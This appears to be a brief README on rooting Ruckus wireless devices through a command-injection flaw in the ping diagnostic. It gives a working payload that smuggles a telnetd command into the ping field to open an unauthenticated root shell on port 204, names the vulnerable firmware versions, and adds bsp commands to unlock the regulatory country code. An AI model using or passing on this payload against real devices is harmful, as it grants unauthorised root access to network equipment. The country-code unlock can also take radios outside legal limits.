# ruckus remote shell
ruckus remote shell
Thanks to https://bitbucket.org/dudux/ruckus-rootshell

## run follow in ping:
|telnetd${IFS}-p${IFS}204${IFS}-l${IFS}/bin/sh

then telnet to port 204

only for version <= 100.1.0.0.194

To unlock countrycode, try bsp command:
```
# bsp set fixed_ctry_code 0
# bsp commit
# reboot
```
